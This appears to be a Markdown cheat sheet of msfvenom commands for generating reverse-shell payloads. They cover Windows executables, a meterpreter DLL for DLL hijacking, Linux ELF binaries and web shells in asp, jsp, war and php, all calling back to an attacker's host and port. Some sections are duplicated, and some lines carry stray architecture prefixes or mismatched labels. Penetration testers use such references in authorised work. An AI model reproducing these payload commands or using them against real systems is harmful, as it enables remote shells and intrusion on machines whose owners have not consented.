
### Table of Contents

- [MsfVenom Commands](#msfvenom-commands)
  - [List all payloads available in Msfvenom](#list-all-payloads-avaible-in-msfvenom)
  - [List all encoders](#list-all-encoders)
- [Payloads for Windows](#payloads-for-windows)
- [DLL Hijacking](#dll-hijacking)
- [Payloads for Linux](#payloads-for-linux)
- [Web Payloads](#web-payloads)

### MsfVenom Commands

#### List all payloads avaible in Msfvenom
```java
msfvenom -l payloads #Payloads
```
#### List all encoders
```java
msfvenom -l encoders #Encoders
```

### Payloads for Windows

```bash
x86 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

### Payloads for Windows

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

### DLL Hijacking
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f dll > payload.dll
```


### Payloads for Linux

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64 msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

### Payloads for Linux

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

### Web Payloads

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
